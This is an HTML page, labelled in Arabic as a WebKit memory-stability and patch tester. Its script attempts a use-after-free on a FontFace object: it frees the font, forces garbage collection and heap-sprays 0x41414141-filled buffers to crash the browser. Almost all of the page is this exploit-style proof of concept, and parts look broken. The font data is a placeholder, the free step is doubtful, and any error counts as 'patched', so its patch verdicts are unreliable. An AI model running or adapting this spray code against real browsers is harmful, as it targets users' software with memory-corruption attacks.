<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>WebKit Memory Stability & Patch Tester</title>
    <style>
        body { background-color: #0a0f1d; color: #00ff66; font-family: 'Courier New', monospace; padding: 50px; text-align: center; }
        .box { border: 2px solid #00ff66; padding: 30px; display: inline-block; max-width: 600px; box-shadow: 0 0 20px rgba(0,255,106,0.3); }
        .status-exists { color: #ff3333; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #ff3333; }
        .status-patched { color: #00ff66; font-weight: bold; font-size: 24px; text-shadow: 0 0 10px #00ff66; }
        button { background: transparent; color: #fff; border: 1px solid #00ff66; padding: 15px 30px; font-size: 18px; cursor: pointer; margin-top: 20px; }
        button:hover { background: #00ff66; color: #0a0f1d; }
    </style>
</head>
<body>

<div class="box">
    <h2>مفحّص استقرار الذاكرة لبيئة WebKit</h2>
    <p>يستهدف هذا الفحص اختبار خلل إدارة الذاكرة في كائنات FontFace الحقيقية</p>
    
    <button onclick="runWebKitExploitTest()">تشغيل الفحص المتقدم</button>
    <br><br>
    <div id="output">في انتظار إشارة البدء...</div>
</div>

<script>
    // عند تحميل الصفحة، نتحقق فوراً من حالة الجلسة السابقة لمعرفة هل انهار المتصفح أم استقر
    window.onload = function() {
        const state = sessionStorage.getItem('webkit_test_state');
        if (state === 'running') {
            // المتصفح انهار أو قفل التبويب فجأة أثناء معالجة المؤشر المتدلي في الـ bmalloc
            document.getElementById('output').innerHTML = "<span class='status-exists'>UAF EXISTS</span><br><br>النتيجة: ثغرة إدارة الذاكرة نشطة وتسببت في انهيار المحرك (Crash).";
            sessionStorage.removeItem('webkit_test_state');
        } else if (state === 'passed') {
            // المتصفح أكمل الرش واستدعى المؤشرات دون أي تعارض في العناوين
            document.getElementById('output').innerHTML = "<span class='status-patched'>UAF PATCHED</span><br><br>النتيجة: المتصفح مستقر تماماً، وتمت إدارة الذاكرة بأمان (Remediated).";
            sessionStorage.removeItem('webkit_test_state');
        }
    }

    // دالة مخصصة لبيئة JavaScriptCore (JSC) لإجبار الـ GC على العمل عبر الضغط الذاكري (Heap Pressure)
    function pumpJSCGarbageCollector() {
        console.log("[*] ضخ كائنات لإجبار الـ WebKit GC على تنظيف الـ Heap...");
        // حجز آلاف الكائنات الصغيرة المتناوبة لإجبار المحرك على عمل Scavenge و Full GC pass
        for (let i = 0; i < 50000; i++) {
            let temp = { a: 1, b: "string_chunk_" + i, c: new Float64Array(8) };
        }
    }

    async function runWebKitExploitTest() {
        document.getElementById('output').innerText = "جاري الحجز والتلاعب بالـ bmalloc allocator...";
        
        // حفظ الحالة: نحن الآن في طور الفحص والتنفيذ الحرج
        sessionStorage.setItem('webkit_test_state', 'running');

        try {
            // 1. تخصيص كائن FontFace حقيقي في لغة الـ C++ الخاصة بالمحرك
            let testFont = new FontFace('WebKitTargetFont', 'url(data:font/woff2;base64,DATA)');
            document.fonts.add(testFont);
            
            // بدء عملية المعالجة الداخلية للمؤشرات
            testFont.load();

            // 2. الحذف المتعمد (Free) لإيجاد حالة الـ Dangling Pointer في النسخ المصابة
            document.fonts.delete(testFont);
            testFont = null;

            // 3. تفعيل مضخة التنظيف لتفريغ حجرة الـ bmalloc فعلياً
            pumpJSCGarbageCollector();

            // 4. رش الذاكرة المتقدم المتوافق مع الـ bmalloc Size Classes
            // نستخدم مصفوفات بأحجام دقيقة (مثال: 0x40 أو 0x80 بايت) لاستبدال كائن الخط المحذوف في نفس الـ Bin
            let bmallocSpray = [];
            for (let i = 0; i < 5000; i++) {
                // حشو الحجرات ببايتات ثابتة تمثل عناوين وهمية لتوليد الكراش الفوري
                let view = new DataView(new ArrayBuffer(64));
                for(let j = 0; j < 64; j += 4) {
                    view.setUint32(j, 0x41414141, true); // قيمة تسبب Segmentation Fault عند القراءة كـ Pointer
                }
                bmallocSpray.push(view);
            }

            // إذا نجح نظام الحماية أو الترقيع في المتصفح، سيمر هذا السطر بسلام دون كراش
            setTimeout(() => {
                sessionStorage.setItem('webkit_test_state', 'passed');
                // عمل ريفريش لتحديث النتيجة والطباعة على الشاشة
                window.location.reload();
            }, 1200);

        } catch (error) {
            // في حال وجود حواجز أمنية تمنع التنفيذ البرمجي دون التسبب في كراش حاد
            sessionStorage.setItem('webkit_test_state', 'passed');
            window.location.reload();
        }
    }
</script>

</body>
</html>
